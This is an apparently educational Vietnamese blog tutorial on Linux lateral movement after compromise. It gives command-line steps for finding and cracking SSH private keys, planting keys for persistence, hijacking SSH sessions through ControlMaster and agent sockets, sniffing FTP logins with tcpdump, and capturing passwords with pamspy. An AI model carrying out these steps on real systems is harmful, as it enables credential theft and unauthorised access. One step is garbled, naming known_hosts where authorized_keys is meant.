![](https://images.viblo.asia/3ab797e1-7158-462a-b7d1-cfc39c392d33.png)

# 1. Lateral Movement là gì ?
Bỏ qua các khái niệm phức tạp, ở đây mình đưa ra mô hình tấn công cơ bản như sau : 

![](https://images.viblo.asia/2668b2ef-8ec4-44ce-b4f3-bf49669eed85.png)

Theo đó , Hacker tấn công chiếm điều khiển vào **Lab1**  rồi từ đó tấn công lan sang **Lab2** , **Lab3**. Quá trình tấn công từ Lab này sang Lab khác như vậy được gọi là Lateral Movement.

# 2. Lateral Movement with SSH
SSH là một giao thức mạng và đồng thời là tên bộ công cụ dùng để giao tiếp giữa các hệ thống được kết nối mạng với nhau. Đây là một phương pháp được sử dụng phổ biến nhất để giao tiếp giữa các máy chủ sử dụng Linux.

Có 2 phương thức xác thực phổ biến với SSH là thông qua mật khẩu và private_key. Nếu private_key được thiết lập thêm một lớp mật khẩu thì người dùng phải nhập mật khẩu này trước khi có thể kết nối được vào SSH.

## SSH Keys

Private key là mục tiêu "ngon ăn" của Hacker nên thường có nhiều biện pháp bảo mật bổ sung. Thông thường nó được chmod với quyền 600. Trong Linux các key này thường được đặt tên dưới dạng **id_rsa** theo mặc định.

Khi tấn công được vào máy A , ta tiến hành tìm kiếm các tệp **id_rsa** này và đầy đủ các thông tin để kết nối với mục tiêu B (nếu có)

Đăng nhập vào máy Victim (trường hợp đã RCE thành công)

Tìm kiếm SSH Key tồn tại trên hệ thống

```bash
find /home/ -name "id_rsa"
```
![](https://images.viblo.asia/b409d4e8-fc03-4c90-bea7-91e50897324b.png)


Sử dụng đặc quyền root để tìm kiếm thêm 

![](https://images.viblo.asia/403dee23-ae0d-4920-90b6-951db33da60e.png)


Xem chừng, đây sẽ là SSH Private Key sử dụng để đăng nhập lab khác , tuy nhiên ta chưa có thông tin gì để biết nó đăng nhập vào đâu ! Thử mở ra xem sao

![](https://images.viblo.asia/86aa3271-83ec-445e-955d-ee3f6a3c5af4.png)


SSH Key này được bảo vệ bởi một mật khẩu thứ cấp . Tiến hành crack nó bằng ssh2john

```bash
python /usr/share/john/ssh2john.py id_rsa > crack.txt
```
![](https://images.viblo.asia/fbb4cf45-6ea1-49fc-8e9d-4597494db702.png)

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt 
```
![](https://images.viblo.asia/d5f5870b-9207-4773-a326-9b7739c6016b.png)

Đã tìm ra mật khẩu thứ cấp cho SSH Key thành công, giờ chúng ta tìm kiếm chỗ để đăng nhập

Tìm kiếm thông tin trong `/etc/passwd` ( Trường hợp SSH key ta tìm thấy phục vụ duy nhất cho mục đích xác thực máy chủ chúng ta đang sở hữu thì quá trình này vô nghĩa) 

![](https://images.viblo.asia/62b1de6f-cb20-4cbe-ad50-2db81de4eac5.png)

Ta nhớ ra rằng, mỗi khi chúng ta tiến hành đăng nhập lần đầu vào máy tính khác sử dụng SSH, đều có dòng thông báo như thế này

![](https://images.viblo.asia/3f960c71-f216-4c77-9b07-fcf553f02445.png)

sau đó nội dung này sẽ được lưu lại ở `.ssh/known_hosts` . Giờ ta tiến hành đọc file này trên máy victim

![](https://images.viblo.asia/afb22c58-8edd-4324-891a-3f378b06f055.png)

Tìm kiếm thông tin trong .bash_history, theo dõi những  command mà nạn nhân đã sử dụng 

![](https://images.viblo.asia/5fdec83c-4142-407c-bbbe-edf4d544affd.png)

## SSH Persistence

Ngoài việc đánh cắp SSH Private Key để tạo điều kiện truy cập vào các hệ thống khác, một chiến thuật hữu ích khác là chèn public_key của chúng ta vào `~/.ssh/authorized_keys` của máy chủ. Tệp này chứa danh sách tất cả các public key được phép truy cập vào hệ thống thông qua tài khoản của người dùng.

Đơn giản là chúng ta sẽ tạo 1 public key, sau đó chèn public key đó vào hệ thống, để giúp ích cho những lần đăng nhập sau được thuận lợi

Tạo cặp Private Key và Public Key

```
ssh-keygen -t rsa -C kali
```
![](https://images.viblo.asia/7d8afe8c-39af-489b-9d1b-7a87e8eff5b9.png)

Thêm Public Key vào `known_hosts` của nạn nhân

![](https://images.viblo.asia/f69ca4db-2552-4c18-a8dd-ba8b8155628f.png)

Kết nối với nạn nhân

```
ssh kali@target.com -i id_rsa 
```
## SSH Hijacking

Ở phần này, chúng ta sẽ đi qua một khái niệm khá mới mẻ SSH Hijacking. Kỹ thuật này đặc biệt hiệu quả cho Lateral Movement.

Ngữ cảnh ở đây là chúng ta sử dụng SSH Connection hiện có để truy cập vào một máy khác. Hai trong số các phương pháp SSH Hijacking phổ biến là sử dụng tính năng ControlMaster và SSH Agent.

### SSH Hijacking with ControlMaster

ControlMaster là một tính năng cho phép chia sẻ nhiều SSH connection qua một kết nối mạng. Chức năng này được thiết lập trong SSH config file của nạn nhân

Chúng ta xem xét kịch bản sau:

Bước 1. SSH vào Linux Controller với user `hoanguyen`

Bước 2. Tạo `~/.ssh/config` với nội dung sau

```
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m
```

* Dấu "*" đầu tiên thể hiện việc "listen" ở tất cả các máy chủ. Trong một số trường hợp, chúng ta có thể chỉ định một máy chủ cụ thể

* ControlPath chỉ định việc lưu output session (PATH lưu vào + định dạng `remoteusername @ <targethost>: <port>`

* ControlMaster = auto : thể hiện mọi connection sẽ sử dụng ControlMaster  Socket khi có thể

* ControlPersist có thể đặt thành yes hoặc một thời gian cụ thể. 
Nếu là yes, Socket sẽ được mở vô thời hạn. Ngoài ra nó sẽ chấp nhận các Socket mới trong một khoảng thời gian nhất định sau khi kết nối cuối cùng kết thúc 


> Nếu sử config file tại /etc/ssh/ssh_config để cấu hình ControlMaster , việc áp dụng sẽ ở mức toàn bộ hệ thống


Bước 3. Tạo thư mục sẽ lưu session & phân quyền lại SSH config

```
chmod 644 ~/.ssh/config
mkdir ~/.ssh/controlmaster
```

**Khai Thác**

Vậy sau khi cấu hình xong,nếu admin đăng nhập vào hệ thống, rồi dùng nó để SSH sang dịch vụ khác. Trên terminal của Hacker sẽ hiện ra session đó. Hacker có thể dùng session này để đăng nhập ( Đương nhiên là không cần authen gì nữa)

![](https://images.viblo.asia/3f0742ba-d43f-461a-a2a4-dda6cfa3db29.png)


### SSH Hijacking Using SSH-Agent and SSH Agent Forwarding

Chúng ta đã tìm hiểu xong cách thức chiếm quyền điều khiển SSH với ControlMaster, hãy chuyển sang một kỹ thuật khác. Phương pháp chiếm quyền điều khiển SSH thông qua `SSH-Agent` và `SSH Agent Forwarding`.

SSH-Agent là một tiện ích theo dõi các private key của người dùng và cho phép sử dụng chúng mà không cần gõ lại mật khẩu với kết nối mới

Truy cập `/etc/ssh/ssh_config` tiến hành cấu hình SSH Agent Forwarding

```
ForwardAgent yes
```
Khởi động lại SSH Service

```
sudo /etc/init.d/ssh restart
```

Lúc này, bất cứ khi nào nạn nhân sử dụng máy chủ đã bị chiếm quyền điều khiển để SSH vào máy thứ 2 . Ta đều nhận được 1 "session" mà thông qua đó có thể đăng nhập mà không cần tài khoản 

![](https://images.viblo.asia/61817d7b-d303-4f81-a257-45cdd6abe6bc.png)

```
SSH_AUTH_SOCK=/tmp/ssh-XXXXXXlID30k/agent.1608 ssh user@victim
```
![](https://images.viblo.asia/28d5528a-f0d4-4f9c-a1cf-14e490a4780e.png)

# 3. Lateral Movement with tcpdump
Trong trường hợp nơi chúng ta đang đứng là FTP Server, có thể sử dụng tcpdump để "ngửi" các lưu lượng gửi tới, từ đó lấy cắp được thông tin người dùng đăng nhập

Kiểm tra cấu hình mạng nạn nhân với `ifconfig`
![](https://images.viblo.asia/d327b050-ce18-4109-a5c8-6bdf63aafc61.png)

Sử dụng `tcpdump` để theo dõi tất cả kết nối FTP tới, từ đó chiếm thông tin đăng nhập của nạn nhân 


```bash
sudo tcpdump -i eth0 -A port ftp > ~/file.out```
```

![](https://images.viblo.asia/178e8115-a481-417e-89c4-f3ad54fc0041.png)

# 4. Lateral Movement with Pamspy
Pamspy là một công cụ đặc biệt thú vị, nó được tạo ra với mục đích theo dõi thư viện PAM (Pluggable Authentication Modules) - một module chịu trách nhiệm xử lý xác thực trên Linux. Nó giám sát  việc người dùng khác kết nối tới máy nạn nhân thông qua SSH , FTP , SMB  đồng thời cũng theo dõi được việc thay đổi mật khẩu từ sudo và passwd. 

Download công cụ từ github của dự án 
![](https://images.viblo.asia/c570b064-aaa6-4424-8b9a-63146623deae.png)

```
wget https://github.com/citronneur/pamspy/releases/download/v0.2/pamspy 
```
Sử dụng Pamspy để giám sát thay đổi của PAM library 

```
./pamspy -p /lib/x86_64-linux-gnu/libpam.so.0
```

Trường hợp chúng ta chưa xác định chính xác vị trí `libpam`, ta có thể sử dụng câu lệnh sau

```
./pamspy -p $(/usr/sbin/ldconfig -p | grep libpam.so | cut -d ' ' -f4)
```

Hoặc muốn output ra một file để tiện theo dõi hoặc send về C&C 

```
./pamspy -p $(/usr/sbin/ldconfig -p | grep libpam.so | cut -d ' ' -f4) -d /tmp/credentials

```

Pamspy "bắt" được mật khẩu khi người dùng từ nơi khác đăng nhập thông qua SSH

![](https://images.viblo.asia/29e8f568-aab3-4372-9aef-40036cc48edb.png)

hay khi người dùng trên máy đổi mật khẩu 

![](https://images.viblo.asia/8ea9ee80-246c-4d76-99f8-851629eec581.png)


Tuy nhiên, quá trình sẽ thất bại nếu nạn nhân sử dụng private key để đăng nhập 


![](https://images.viblo.asia/d4f498a5-1704-4ccb-b83c-169b26235dd8.png)